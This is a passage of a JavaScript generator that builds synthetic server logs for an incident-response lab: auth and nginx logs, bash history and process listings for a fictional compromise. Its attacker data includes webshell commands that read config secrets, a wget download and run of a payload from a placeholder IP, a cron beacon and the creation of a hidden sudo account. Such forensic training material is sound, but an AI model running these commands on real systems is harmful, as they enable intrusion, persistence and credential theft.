const { createHash } = require("node:crypto");

const text = (value) => Buffer.from(value.replace(/\r?\n/g, "\n"), "utf8");
const minuteMs = 60 * 1000;
const dayMs = 24 * 60 * 60 * 1000;

function mulberry32(seed) {
  let value = seed >>> 0;
  return () => {
    value |= 0;
    value = (value + 0x6d2b79f5) | 0;
    let result = Math.imul(value ^ (value >>> 15), 1 | value);
    result ^= result + Math.imul(result ^ (result >>> 7), 61 | result);
    return ((result ^ (result >>> 14)) >>> 0) / 4294967296;
  };
}

function pick(rng, values) {
  return values[Math.floor(rng() * values.length)];
}

function randomHex(rng, length) {
  const alphabet = "0123456789abcdef";
  let output = "";
  for (let index = 0; index < length; index += 1) output += alphabet[Math.floor(rng() * alphabet.length)];
  return output;
}

function fakeShadow(rng) {
  const alphabet = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789./";
  let salt = "";
  let body = "";
  for (let index = 0; index < 16; index += 1) salt += alphabet[Math.floor(rng() * alphabet.length)];
  for (let index = 0; index < 43; index += 1) body += alphabet[Math.floor(rng() * alphabet.length)];
  return `$y$j9T$${salt}$${body}`;
}

function iso(utcString) {
  return new Date(utcString).toISOString().replace(".000Z", "Z");
}

function dayDiff(fromDate, toDate) {
  return Math.round((Date.parse(`${toDate}T00:00:00Z`) - Date.parse(`${fromDate}T00:00:00Z`)) / dayMs);
}

function minuteDiff(fromIso, toIso) {
  return Math.round((Date.parse(toIso) - Date.parse(fromIso)) / minuteMs);
}

function roundPercent(value) {
  return Math.floor(value + 0.5);
}

function monthName(index) {
  return ["Jan", "Feb", "Mar", "Apr", "May", "Jun", "Jul", "Aug", "Sep", "Oct", "Nov", "Dec"][index];
}

function syslogStamp(isoValue) {
  const date = new Date(isoValue);
  return `${monthName(date.getUTCMonth())} ${String(date.getUTCDate()).padStart(2, " ")} ${String(date.getUTCHours()).padStart(2, "0")}:${String(date.getUTCMinutes()).padStart(2, "0")}:${String(date.getUTCSeconds()).padStart(2, "0")}`;
}

function nginxStamp(isoValue) {
  const date = new Date(isoValue);
  return `${String(date.getUTCDate()).padStart(2, "0")}/${monthName(date.getUTCMonth())}/${date.getUTCFullYear()}:${String(date.getUTCHours()).padStart(2, "0")}:${String(date.getUTCMinutes()).padStart(2, "0")}:${String(date.getUTCSeconds()).padStart(2, "0")} +0000`;
}

function authLine(isoValue, host, service, pid, message) {
  return { iso: isoValue, line: `${syslogStamp(isoValue)} ${host} ${service}[${pid}]: ${message}` };
}

function accessLine(ip, isoValue, method, requestPath, status, bytes, referer, agent) {
  return {
    iso: isoValue,
    line: `${ip} - - [${nginxStamp(isoValue)}] "${method} ${requestPath} HTTP/1.1" ${status} ${bytes} "${referer}" "${agent}"`,
  };
}

function psLine(user, pid, cpu, mem, vsz, rss, tty, stat, start, time, command) {
  return `${user.padEnd(12, " ")}${String(pid).padStart(5, " ")} ${cpu.toFixed(1).padStart(4, " ")} ${mem.toFixed(1).padStart(4, " ")} ${String(vsz).padStart(7, " ")} ${String(rss).padStart(6, " ")} ${tty.padEnd(8, " ")} ${stat.padEnd(4, " ")} ${start.padEnd(7, " ")} ${time.padStart(6, " ")} ${command}`;
}

function findLsLine(inode, blocks, mode, links, owner, group, size, isoValue, filePath) {
  const date = new Date(isoValue);
  return `${String(inode).padStart(8, " ")} ${String(blocks).padStart(4, " ")} ${mode} ${String(links).padStart(2, " ")} ${owner.padEnd(8, " ")} ${group.padEnd(8, " ")} ${String(size).padStart(7, " ")} ${date.getUTCFullYear()}-${String(date.getUTCMonth() + 1).padStart(2, "0")}-${String(date.getUTCDate()).padStart(2, "0")} ${String(date.getUTCHours()).padStart(2, "0")}:${String(date.getUTCMinutes()).padStart(2, "0")} ${filePath}`;
}

function tsv(headers, rows) {
  return `${headers.join("\t")}\n${rows.map((row) => headers.map((header) => row[header] ?? "").join("\t")).join("\n")}\n`;
}

function asset(kind, title, description, name) {
  return { kind, title, description, url: `/labs/${name}` };
}

function buildIncidentAssets() {
  const rng = mulberry32(0xc0ffee33);
  const host = "srv-web01";
  const bruteForceIp = "203.0.113.91";
  const webshellIp = "198.51.100.62";
  const outboundIp = "192.0.2.77";
  const firstWebshellIso = "2026-04-21T14:06:11Z";
  const firstSshSuccessIso = "2026-04-21T14:18:07Z";
  const hiddenAccountCreateIso = "2026-04-21T14:25:11Z";
  const uploadedRelative = "/espace-adherents/uploads/scan-review.php";
  const uploadedAbsolute = "/var/www/html/espace-adherents/uploads/scan-review.php";
  const modifiedSiteFile = "/var/www/html/espace-adherents/upload.php";
  const webUser = "www-data";
  const sshServiceAccount = "svc-web";
  const hiddenAccount = "sysmaint";
  const cronScriptPath = "/usr/local/bin/system-cache-refresh.sh";
  const cronCommand = `${cronScriptPath} >/dev/null 2>&1`;
  const outboundTarget = `${outboundIp}:8088`;
  const bruteForceNoiseIps = ["198.51.100.23", "198.51.100.101", "203.0.113.150"];
  const legitimateUsers = [
    { user: "odiallo", ip: "10.20.0.100", fingerprint: "ED25519 SHA256:9v2YK1r7ZsM0dQnX3NwT", opens: ["2026-04-21T07:12:17Z", "2026-04-21T13:22:48Z", "2026-04-21T20:07:31Z", "2026-04-22T05:41:44Z"] },
    { user: "nkamga", ip: "203.0.113.44", fingerprint: "RSA SHA256:U5x7L9eQ2mYc8JdR1BvK", opens: ["2026-04-21T09:40:05Z", "2026-04-21T16:18:12Z", "2026-04-22T01:14:09Z"] },
    { user: "adjovi", ip: "203.0.113.18", fingerprint: "ED25519 SHA256:2mVf7pQ8kL3xY0nB6sD1", opens: ["2026-04-21T18:05:49Z", "2026-04-22T04:12:22Z"] },
    { user: "emballa", ip: "203.0.113.24", fingerprint: "ED25519 SHA256:6sR0nP2qW4cY8jT5mH1a", opens: ["2026-04-21T11:58:36Z"] },
  ];

  const authEvents = [];
  let cronPid = 900;
  for (let time = Date.parse("2026-04-21T00:00:00Z"); time <= Date.parse("2026-04-22T06:00:00Z"); time += 12 * minuteMs) {
    const openIso = iso(time);
    const closeIso = iso(time + 4000);
    authEvents.push(authLine(openIso, host, "CRON", cronPid, "pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)"));
    authEvents.push(authLine(closeIso, host, "CRON", cronPid, "pam_unix(cron:session): session closed for user root"));
    cronPid += 1;
  }

  let sshPid = 1500;
  for (const session of legitimateUsers) {
    for (const open of session.opens) {
      const openDate = Date.parse(open);
      const port = 42000 + Math.floor(rng() * 12000);
      authEvents.push(authLine(open, host, "sshd", sshPid, `Accepted publickey for ${session.user} from ${session.ip} port ${port} ssh2: ${session.fingerprint}`));
      authEvents.push(authLine(iso(openDate + 1000), host, "sshd", sshPid, `pam_unix(sshd:session): session opened for user ${session.user}(uid=${1000 + sshPid % 40}) by (uid=0)`));
      if (session.user === "odiallo") {
        authEvents.push(authLine(iso(openDate + 9 * minuteMs), host, "sudo", sshPid + 200, `${session.user} : TTY=pts/0 ; PWD=/home/${session.user} ; USER=root ; COMMAND=/usr/bin/systemctl reload nginx`));
      }
      authEvents.push(authLine(iso(openDate + 32 * minuteMs + Math.floor(rng() * 6) * minuteMs), host, "sshd", sshPid, `pam_unix(sshd:session): session closed for user ${session.user}`));
      sshPid += 7;
    }
  }

  const noiseAttempts = [
    { ip: bruteForceNoiseIps[0], user: "invalid user admin", isoValue: "2026-04-21T02:17:05Z" },
    { ip: bruteForceNoiseIps[0], user: "root", isoValue: "2026-04-21T02:17:44Z" },
    { ip: bruteForceNoiseIps[0], user: "invalid user test", isoValue: "2026-04-21T02:18:19Z" },
    { ip: bruteForceNoiseIps[1], user: "invalid user deploy", isoValue: "2026-04-21T06:40:55Z" },
    { ip: bruteForceNoiseIps[1], user: "root", isoValue: "2026-04-21T06:41:21Z" },
    { ip: bruteForceNoiseIps[1], user: "odiallo", isoValue: "2026-04-21T06:42:03Z" },
    { ip: bruteForceNoiseIps[2], user: "invalid user backup", isoValue: "2026-04-21T22:15:17Z" },
    { ip: bruteForceNoiseIps[2], user: "nkamga", isoValue: "2026-04-21T22:15:49Z" },
    { ip: bruteForceNoiseIps[2], user: "invalid user support", isoValue: "2026-04-21T22:16:20Z" },
  ];
  let noisePid = 2400;
  for (const attempt of noiseAttempts) {
    const port = 50000 + Math.floor(rng() * 10000);
    authEvents.push(authLine(attempt.isoValue, host, "sshd", noisePid, `Failed password for ${attempt.user} from ${attempt.ip} port ${port} ssh2`));
    authEvents.push(authLine(iso(Date.parse(attempt.isoValue) + 2000), host, "sshd", noisePid, `Connection closed by authenticating user ${attempt.user.replace("invalid user ", "")} ${attempt.ip} port ${port} [preauth]`));
    noisePid += 5;
  }

  const attackFailureTimeline = [
    ["2026-04-21T13:51:02Z", "invalid user admin"],
    ["2026-04-21T13:52:24Z", "root"],
    ["2026-04-21T13:53:17Z", "invalid user support"],
    ["2026-04-21T13:54:31Z", "odiallo"],
    ["2026-04-21T13:55:42Z", "root"],
    ["2026-04-21T13:57:18Z", "svc-web"],
    ["2026-04-21T13:58:47Z", "invalid user prestataire"],
    ["2026-04-21T14:00:02Z", "root"],
    ["2026-04-21T14:01:16Z", "svc-web"],
    ["2026-04-21T14:02:25Z", "invalid user ubuntu"],
    ["2026-04-21T14:03:11Z", "odiallo"],
    ["2026-04-21T14:04:08Z", "root"],
    ["2026-04-21T14:05:39Z", "svc-web"],
    ["2026-04-21T14:07:02Z", "svc-web"],
  ];
  let attackPid = 2800;
  for (const [timeIso, account] of attackFailureTimeline) {
    const port = 51200 + Math.floor(rng() * 1000);
    authEvents.push(authLine(timeIso, host, "sshd", attackPid, `Failed password for ${account} from ${bruteForceIp} port ${port} ssh2`));
    if (account.startsWith("invalid user")) {
      authEvents.push(authLine(iso(Date.parse(timeIso) + 1000), host, "sshd", attackPid, `Invalid user ${account.replace("invalid user ", "")} from ${bruteForceIp} port ${port}`));
    }
    if (Math.floor(rng() * 3) === 1) {
      authEvents.push(authLine(iso(Date.parse(timeIso) + 3000), host, "sshd", attackPid, `Connection closed by authenticating user ${account.replace("invalid user ", "")} ${bruteForceIp} port ${port} [preauth]`));
    }
    attackPid += 4;
  }

  authEvents.push(authLine(firstSshSuccessIso, host, "sshd", 3114, `Accepted password for ${sshServiceAccount} from ${webshellIp} port 56318 ssh2`));
  authEvents.push(authLine("2026-04-21T14:18:09Z", host, "sshd", 3114, `pam_unix(sshd:session): session opened for user ${sshServiceAccount}(uid=996) by (uid=0)`));
  authEvents.push(authLine("2026-04-21T14:21:42Z", host, "sudo", 3190, `${sshServiceAccount} : TTY=pts/1 ; PWD=/var/www ; USER=root ; COMMAND=/usr/bin/tee /etc/cron.d/system-cache`));
  authEvents.push(authLine("2026-04-21T14:22:03Z", host, "sudo", 3194, `${sshServiceAccount} : TTY=pts/1 ; PWD=/var/www ; USER=root ; COMMAND=/usr/bin/tee ${cronScriptPath}`));
  authEvents.push(authLine(hiddenAccountCreateIso, host, "sudo", 3207, `${sshServiceAccount} : TTY=pts/1 ; PWD=/var/www ; USER=root ; COMMAND=/usr/sbin/useradd -m -s /bin/bash -G sudo ${hiddenAccount}`));
  authEvents.push(authLine("2026-04-21T14:25:13Z", host, "useradd", 3208, `new user: name=${hiddenAccount}, UID=1008, GID=1008, home=/home/${hiddenAccount}, shell=/bin/bash, from=/dev/pts/1`));
  authEvents.push(authLine("2026-04-21T14:25:31Z", host, "sudo", 3214, `${sshServiceAccount} : TTY=pts/1 ; PWD=/var/www ; USER=root ; COMMAND=/usr/sbin/chpasswd -e`));
  authEvents.push(authLine("2026-04-21T14:25:33Z", host, "groupadd", 3215, `new group: name=${hiddenAccount}, GID=1008`));
  authEvents.push(authLine("2026-04-21T14:26:04Z", host, "sudo", 3221, `${sshServiceAccount} : TTY=pts/1 ; PWD=/var/www ; USER=root ; COMMAND=/usr/bin/chmod 755 ${cronScriptPath}`));
  authEvents.push(authLine("2026-04-21T14:29:12Z", host, "sshd", 3114, `pam_unix(sshd:session): session closed for user ${sshServiceAccount}`));

  const authLog = authEvents.sort((left, right) => left.iso.localeCompare(right.iso)).map((entry) => entry.line).join("\n") + "\n";

  const normalVisitors = [
    "203.0.113.18", "203.0.113.24", "203.0.113.33", "203.0.113.44", "203.0.113.55", "203.0.113.66",
    "203.0.113.78", "203.0.113.84", "10.20.0.100", "10.20.0.112",
  ];
  const robotIps = ["198.51.100.17", "198.51.100.29", "203.0.113.143"];
  const robotPaths = ["/robots.txt", "/sitemap.xml", "/favicon.ico", "/assets/logo.svg"];
  const scannerIps = ["198.51.100.150", "203.0.113.201", "198.51.100.203"];
  const scannerPaths = ["/wp-login.php", "/.env", "/phpmyadmin/", "/server-status", "/config.php.bak"];
  const pagePaths = [
    { method: "GET", path: "/", status: 301, bytes: 178, referer: "-", asset: false },
    { method: "GET", path: "/index.php", status: 200, bytes: 4280, referer: "-", asset: false },
    { method: "GET", path: "/actualites.php", status: 200, bytes: 6210, referer: "https://www.alize.example/", asset: false },
    { method: "GET", path: "/espace-adherents/login.php", status: 200, bytes: 5128, referer: "https://www.alize.example/", asset: false },
    { method: "GET", path: "/assets/site.css", status: 200, bytes: 3821, referer: "https://www.alize.example/index.php", asset: true },
    { method: "GET", path: "/assets/logo.svg", status: 304, bytes: 0, referer: "https://www.alize.example/index.php", asset: true },
    { method: "GET", path: "/assets/app.js", status: 200, bytes: 9733, referer: "https://www.alize.example/espace-adherents/login.php", asset: true },
    { method: "GET", path: "/espace-adherents/dossier.php", status: 200, bytes: 6842, referer: "https://www.alize.example/espace-adherents/login.php", asset: false },
    { method: "POST", path: "/espace-adherents/login.php", status: 302, bytes: 178, referer: "https://www.alize.example/espace-adherents/login.php", asset: false },
  ];
  const agents = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Firefox/138.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/135.0",
    "Mozilla/5.0 (X11; Linux x86_64) Firefox/137.0",
    "Mozilla/5.0 (Linux; Android 14) Chrome/134.0 Mobile",
  ];
  const accessEvents = [];
  let current = Date.parse("2026-04-21T00:00:00Z");
  while (current <= Date.parse("2026-04-22T06:00:00Z")) {
    const roll = rng();
    if (roll < 0.72) {
      const visitor = pick(rng, normalVisitors);
      const page = pick(rng, pagePaths);
      const pathValue = page.asset ? page.path : page.path;
      accessEvents.push(accessLine(visitor, iso(current), page.method, pathValue, page.status, page.bytes, page.referer, pick(rng, agents)));
    } else if (roll < 0.84) {
      const visitor = pick(rng, normalVisitors);
      accessEvents.push(accessLine(visitor, iso(current), "GET", pick(rng, robotPaths), 200, Math.floor(200 + rng() * 1300), "-", "Mozilla/5.0 (compatible; AdsBot/3.1; +https://example.invalid/bot)"));
    } else if (roll < 0.92) {
      const ip = pick(rng, scannerIps);
      const pathValue = pick(rng, scannerPaths);
      const status = pathValue === "/server-status" ? 403 : 404;
      accessEvents.push(accessLine(ip, iso(current), "GET", pathValue, status, status === 403 ? 146 : 512, "-", "Mozilla/5.0 zgrab/0.x"));
    } else {
      const visitor = pick(rng, normalVisitors);
      accessEvents.push(accessLine(visitor, iso(current), "GET", `/media/documents/guide-${String(1 + Math.floor(rng() * 4)).padStart(2, "0")}.pdf`, 200, Math.floor(18000 + rng() * 6000), "https://www.alize.example/actualites.php", pick(rng, agents)));
    }
    current += (100 + Math.floor(rng() * 70)) * 1000;
  }

  const legitimateUploads = [
    accessLine("203.0.113.44", "2026-04-21T11:22:44Z", "POST", "/espace-adherents/upload.php", 200, 328, "https://www.alize.example/espace-adherents/dossier.php", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/135.0"),
    accessLine("203.0.113.44", "2026-04-21T11:22:51Z", "GET", "/espace-adherents/uploads/carte-atelier-0421.jpg", 200, 28411, "https://www.alize.example/espace-adherents/dossier.php", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/135.0"),
    accessLine("203.0.113.24", "2026-04-21T18:47:18Z", "POST", "/espace-adherents/upload.php", 200, 319, "https://www.alize.example/espace-adherents/dossier.php", "Mozilla/5.0 (X11; Linux x86_64) Firefox/137.0"),
    accessLine("203.0.113.24", "2026-04-21T18:47:23Z", "GET", "/espace-adherents/uploads/recu-cotisation-avril.pdf", 200, 19624, "https://www.alize.example/espace-adherents/dossier.php", "Mozilla/5.0 (X11; Linux x86_64) Firefox/137.0"),
  ];

  const attackAccess = [
    accessLine(webshellIp, "2026-04-21T14:05:28Z", "POST", "/espace-adherents/upload.php", 200, 312, "https://www.alize.example/espace-adherents/dossier.php", "Mozilla/5.0 (X11; Linux x86_64) Firefox/138.0"),
    accessLine(webshellIp, firstWebshellIso, "GET", `${uploadedRelative}?cmd=id`, 200, 79, "-", "Mozilla/5.0 (X11; Linux x86_64) Firefox/138.0"),
    accessLine(webshellIp, "2026-04-21T14:06:43Z", "GET", `${uploadedRelative}?cmd=cat+/var/www/html/espace-adherents/config/app.env`, 200, 421, "-", "Mozilla/5.0 (X11; Linux x86_64) Firefox/138.0"),
    accessLine(webshellIp, "2026-04-21T14:07:18Z", "GET", `${uploadedRelative}?cmd=uname+-a`, 200, 142, "-", "Mozilla/5.0 (X11; Linux x86_64) Firefox/138.0"),
    accessLine(webshellIp, "2026-04-21T14:08:04Z", "GET", `${uploadedRelative}?cmd=printf+controle`, 200, 72, "-", "Mozilla/5.0 (X11; Linux x86_64) Firefox/138.0"),
    accessLine(webshellIp, "2026-04-21T14:09:38Z", "GET", `${uploadedRelative}?cmd=grep+SFTP_SYNC_USER+/var/www/html/espace-adherents/config/app.env`, 200, 118, "-", "Mozilla/5.0 (X11; Linux x86_64) Firefox/138.0"),
    accessLine(webshellIp, "2026-04-21T14:11:14Z", "GET", `${uploadedRelative}?cmd=ls+-la+/var/www/html/espace-adherents/uploads`, 200, 366, "-", "Mozilla/5.0 (X11; Linux x86_64) Firefox/138.0"),
  ];

  const accessLog = [...accessEvents, ...legitimateUploads, ...attackAccess]
    .sort((left, right) => left.iso.localeCompare(right.iso))
    .map((entry) => entry.line)
    .join("\n") + "\n";

  const historyLines = [
    "  141  2026-04-21 14:18:19 id",
    "  142  2026-04-21 14:18:24 whoami",
    "  143  2026-04-21 14:18:31 pwd",
    "  144  2026-04-21 14:18:38 uname -a",
    "  145  2026-04-21 14:18:53 ls -la /var/www/html/espace-adherents",
    "  146  2026-04-21 14:19:01 cat /etc/passwd | tail",
    "  147  2026-04-21 14:19:12 cat /var/www/html/espace-adherents/config/app.env",
    "  148  2026-04-21 14:19:20 sudo -l",
    "  149  2026-04-21 14:19:28 mkdir -p /tmp/.cache",
    `  150  2026-04-21 14:19:39 wget -O /tmp/.cache/system-check http://${outboundIp}/updates/system-check.txt`,
    "  151  2026-04-21 14:19:48 chmod +x /tmp/.cache/system-check",
    "  152  2026-04-21 14:20:04 /tmp/.cache/system-check --mode dry-run --target 192.0.2.77:8088",
    "  153  2026-04-21 14:20:22 ls -la /tmp/.cache",
    "  154  2026-04-21 14:20:41 cat /etc/hosts",
    "  155  2026-04-21 14:20:55 getent passwd svc-web",
    `  156  2026-04-21 14:21:42 printf '*/10 * * * * root ${cronCommand}\\n' | sudo /usr/bin/tee /etc/cron.d/system-cache >/dev/null`,
    `  157  2026-04-21 14:22:03 printf '#!/bin/sh\\n/tmp/.cache/system-check --mode beacon --target ${outboundTarget}\\n' | sudo /usr/bin/tee ${cronScriptPath} >/dev/null`,
    `  158  2026-04-21 14:22:16 sudo chmod 755 ${cronScriptPath}`,
    "  159  2026-04-21 14:22:31 crontab -l",
    "  160  2026-04-21 14:22:45 ss -tunap | grep 8088",
    "  161  2026-04-21 14:23:04 history | tail -n 20",
    "  162  2026-04-21 14:23:19 cat /etc/group | grep sudo",
    "  163  2026-04-21 14:23:46 ls -la /usr/local/bin",
    "  164  2026-04-21 14:24:12 cat /etc/issue",
    `  165  2026-04-21 14:25:11 sudo /usr/sbin/useradd -m -s /bin/bash -G sudo ${hiddenAccount}`,
    `  166  2026-04-21 14:25:31 echo '${hiddenAccount}:${fakeShadow(rng)}' | sudo /usr/sbin/chpasswd -e`,
    "  167  2026-04-21 14:25:46 grep sysmaint /etc/passwd",
    "  168  2026-04-21 14:26:08 true",
    "  169  2026-04-21 14:26:40 exit",
  ].join("\n") + "\n";

  const psRows = [
    "USER         PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND",
    psLine("root", 1, 0.0, 0.2, 168936, 13092, "?", "Ss", "Apr21", "0:04", "/sbin/init"),
    psLine("root", 2, 0.0, 0.0, 0, 0, "?", "S", "Apr21", "0:00", "[kthreadd]"),
    psLine("root", 3, 0.0, 0.0, 0, 0, "?", "I<", "Apr21", "0:00", "[rcu_gp]"),
    psLine("root", 4, 0.0, 0.0, 0, 0, "?", "I<", "Apr21", "0:00", "[rcu_par_gp]"),
    psLine("root", 6, 0.0, 0.0, 0, 0, "?", "I<", "Apr21", "0:00", "[kworker/0:0H-events_highpri]"),
    psLine("root", 7, 0.0, 0.0, 0, 0, "?", "I<", "Apr21", "0:00", "[mm_percpu_wq]"),
    psLine("root", 11, 0.0, 0.0, 0, 0, "?", "I<", "Apr21", "0:00", "[rcu_tasks_rude_]"),
    psLine("root", 19, 0.0, 0.0, 0, 0, "?", "S", "Apr21", "0:00", "[ksoftirqd/0]"),
    psLine("root", 20, 0.0, 0.0, 0, 0, "?", "I", "Apr21", "0:01", "[rcu_preempt]"),
    psLine("root", 25, 0.0, 0.0, 0, 0, "?", "S", "Apr21", "0:00", "[migration/0]"),
    psLine("root", 32, 0.0, 0.0, 0, 0, "?", "S", "Apr21", "0:00", "[kcompactd0]"),
    psLine("root", 33, 0.0, 0.0, 0, 0, "?", "SN", "Apr21", "0:00", "[ksmd]"),
    psLine("root", 34, 0.0, 0.0, 0, 0, "?", "SN", "Apr21", "0:00", "[khugepaged]"),
    psLine("root", 55, 0.0, 0.0, 0, 0, "?", "I<", "Apr21", "0:00", "[kintegrityd]"),
    psLine("root", 72, 0.0, 0.0, 0, 0, "?", "I<", "Apr21", "0:00", "[kworker/u2:0-events_unbound]"),
    psLine("root", 101, 0.0, 0.1, 27284, 5612, "?", "Ss", "Apr21", "0:01", "/lib/systemd/systemd-journald"),
    psLine("root", 132, 0.0, 0.1, 25980, 4324, "?", "Ss", "Apr21", "0:00", "/lib/systemd/systemd-udevd"),
    psLine("systemd-network", 233, 0.0, 0.1, 25716, 4824, "?", "Ss", "Apr21", "0:00", "/lib/systemd/systemd-networkd"),
    psLine("systemd-timesync", 241, 0.0, 0.1, 90548, 5232, "?", "Ss", "Apr21", "0:00", "/lib/systemd/systemd-timesyncd"),
    psLine("messagebus", 265, 0.0, 0.1, 9856, 5348, "?", "Ss", "Apr21", "0:00", "/usr/bin/dbus-daemon --system --address=systemd: --nofork --nopidfile --systemd-activation --syslog-only"),
    psLine("root", 281, 0.0, 0.1, 11980, 6124, "?", "Ss", "Apr21", "0:00", "/usr/sbin/rsyslogd -n -iNONE"),
    psLine("root", 309, 0.0, 0.1, 11852, 5888, "?", "Ss", "Apr21", "0:00", "/usr/sbin/cron -f"),
    psLine("root", 351, 0.0, 0.2, 21336, 8988, "?", "Ss", "Apr21", "0:00", "/usr/sbin/sshd -D"),
    psLine("root", 384, 0.0, 0.2, 132600, 11432, "?", "Ssl", "Apr21", "0:03", "/usr/bin/python3 /usr/bin/fail2ban-server -xf start"),
    psLine("root", 411, 0.0, 0.1, 17884, 6128, "?", "Ss", "Apr21", "0:00", "/lib/systemd/systemd-logind"),
    psLine("root", 455, 0.0, 0.1, 70640, 5828, "?", "Ss", "Apr21", "0:00", "/usr/libexec/polkitd --no-debug"),
    psLine("root", 488, 0.0, 0.1, 8924, 3748, "tty1", "Ss+", "Apr21", "0:00", "/sbin/agetty -o -p -- \\u --noclear tty1 linux"),
    psLine("root", 521, 0.0, 0.1, 287616, 10824, "?", "Ssl", "Apr21", "0:02", "/usr/bin/containerd"),
    psLine("root", 568, 0.0, 0.1, 69840, 6500, "?", "Ss", "Apr21", "0:00", "/usr/sbin/nginx -g daemon off;"),
    psLine(webUser, 571, 0.0, 0.4, 73340, 15892, "?", "S", "Apr21", "0:01", "nginx: worker process"),
    psLine(webUser, 572, 0.0, 0.4, 73340, 15924, "?", "S", "Apr21", "0:01", "nginx: worker process"),
    psLine(webUser, 573, 0.0, 0.4, 73340, 15836, "?", "S", "Apr21", "0:01", "nginx: worker process"),
    psLine(webUser, 574, 0.0, 0.4, 73340, 15880, "?", "S", "Apr21", "0:01", "nginx: worker process"),
    psLine("root", 622, 0.0, 0.1, 21412, 6728, "?", "Ss", "Apr21", "0:00", "php-fpm: master process (/etc/php/8.2/fpm/php-fpm.conf)"),
    psLine(webUser, 625, 0.1, 0.8, 289412, 29624, "?", "S", "08:01", "0:11", "php-fpm: pool espace-adherents"),
    psLine(webUser, 628, 0.1, 0.7, 288988, 28120, "?", "S", "08:15", "0:09", "php-fpm: pool espace-adherents"),
    psLine(webUser, 631, 0.1, 0.7, 288996, 27844, "?", "S", "09:10", "0:08", "php-fpm: pool espace-adherents"),
    psLine(webUser, 634, 0.1, 0.7, 289112, 28084, "?", "S", "12:31", "0:10", "php-fpm: pool espace-adherents"),
    psLine("mysql", 711, 0.1, 1.2, 1348292, 48612, "?", "Ssl", "Apr21", "0:06", "/usr/sbin/mariadbd"),
    psLine("root", 744, 0.0, 0.2, 602416, 9120, "?", "Ssl", "Apr21", "0:01", "/usr/bin/python3 /usr/share/unattended-upgrades/unattended-upgrade-shutdown --wait-for-signal"),
    psLine("root", 771, 0.0, 0.1, 90540, 6120, "?", "Ss", "Apr21", "0:00", "/usr/lib/systemd/systemd-hostnamed"),
    psLine("root", 812, 0.0, 0.2, 15472, 8128, "?", "Ss", "Apr21", "0:01", "/usr/sbin/rsync --daemon --no-detach"),
    psLine("root", 900, 0.0, 0.0, 0, 0, "?", "I", "Apr21", "0:00", "[kworker/0:1-events]"),
    psLine("root", 1066, 0.0, 0.0, 0, 0, "?", "I", "Apr21", "0:00", "[kworker/1:0-events]"),
    psLine("root", 1201, 0.0, 0.1, 9836, 4728, "?", "Ss", "Apr21", "0:00", "/usr/sbin/atd -f"),
    psLine("root", 1320, 0.0, 0.0, 0, 0, "?", "I", "Apr21", "0:00", "[jbd2/vda1-8]"),
    psLine("root", 1412, 0.0, 0.1, 11068, 4924, "?", "Ss", "Apr21", "0:00", "/usr/sbin/apache2 -k start"),
    psLine("www-data", 1415, 0.0, 0.2, 205788, 9124, "?", "S", "Apr21", "0:01", "/usr/sbin/apache2 -k start"),
    psLine("www-data", 1418, 0.0, 0.2, 205788, 9008, "?", "S", "Apr21", "0:01", "/usr/sbin/apache2 -k start"),
    psLine("root", 1522, 0.0, 0.0, 0, 0, "?", "I", "Apr21", "0:00", "[kworker/u3:1-events_power_efficient]"),
    psLine("root", 1601, 0.0, 0.1, 13048, 5480, "?", "Ss", "Apr21", "0:00", "/usr/sbin/ModemManager"),
    psLine("root", 1744, 0.0, 0.1, 10264, 4212, "?", "Ss", "Apr21", "0:00", "/usr/bin/networkd-dispatcher --run-startup-triggers"),
    psLine("root", 1862, 0.0, 0.1, 10352, 4528, "?", "Ss", "Apr21", "0:00", "/usr/sbin/smartd -n"),
    psLine("root", 1980, 0.0, 0.0, 0, 0, "?", "I", "Apr21", "0:00", "[kworker/2:2-events]"),
    psLine("root", 2140, 0.0, 0.1, 11232, 4784, "?", "Ss", "Apr21", "0:00", "/usr/sbin/cron -f"),
    psLine("root", 2212, 0.0, 0.1, 10360, 4280, "?", "Ss", "Apr21", "0:00", "/usr/sbin/irqbalance --foreground"),
    psLine("root", 2388, 0.0, 0.1, 11236, 4188, "?", "Ss", "Apr21", "0:00", "/usr/sbin/agetty -o -p -- \\u --keep-baud 115200,38400,9600 ttyS0 vt220"),
    psLine("root", 2610, 0.0, 0.0, 0, 0, "?", "I", "Apr21", "0:00", "[kworker/0:2-events]"),
    psLine("root", 2841, 0.0, 0.0, 0, 0, "?", "I", "Apr21", "0:00", "[kworker/3:0-mm_percpu_wq]"),
    psLine(sshServiceAccount, 3116, 0.0, 0.2, 11320, 8820, "pts/1", "Ss", "14:18", "0:00", "-bash"),
    psLine("root", 3190, 0.0, 0.1, 9804, 4020, "pts/1", "S+", "14:21", "0:00", "sudo /usr/bin/tee /etc/cron.d/system-cache"),
    psLine("root", 3194, 0.0, 0.1, 9804, 3988, "pts/1", "S+", "14:22", "0:00", `sudo /usr/bin/tee ${cronScriptPath}`),
    psLine("root", 3207, 0.0, 0.1, 9824, 4064, "pts/1", "S+", "14:25", "0:00", `sudo /usr/sbin/useradd -m -s /bin/bash -G sudo ${hiddenAccount}`),
    psLine("root", 3214, 0.0, 0.1, 9828, 4076, "pts/1", "S+", "14:25", "0:00", "sudo /usr/sbin/chpasswd -e"),
    psLine(sshServiceAccount, 4147, 18.2, 0.7, 18924, 28716, "?", "Sl", "14:19", "1:26", `/tmp/.cache/system-check --mode beacon --target ${outboundTarget}`),
    psLine("root", 4172, 0.0, 0.0, 0, 0, "?", "I", "14:20", "0:00", "[kworker/1:3-events]"),
    psLine("root", 4210, 0.0, 0.2, 9812, 8068, "?", "Ss", "14:26", "0:00", "/usr/sbin/sshd -D"),
    psLine(hiddenAccount, 4266, 0.0, 0.1, 11244, 4820, "?", "Ss", "14:26", "0:00", "sshd: sysmaint [priv]"),
    psLine(hiddenAccount, 4271, 0.0, 0.1, 11320, 5104, "pts/2", "S", "14:26", "0:00", "-bash"),
  ];
  const psText = `${psRows.join("\n")}\n`;

  const portsText = [
    "Netid State  Recv-Q Send-Q Local Address:Port Peer Address:Port Process",
    'tcp   LISTEN 0      128          0.0.0.0:22        0.0.0.0:*     users:(("sshd",pid=351,fd=3))',
    'tcp   LISTEN 0      511          0.0.0.0:80        0.0.0.0:*     users:(("nginx",pid=568,fd=6))',
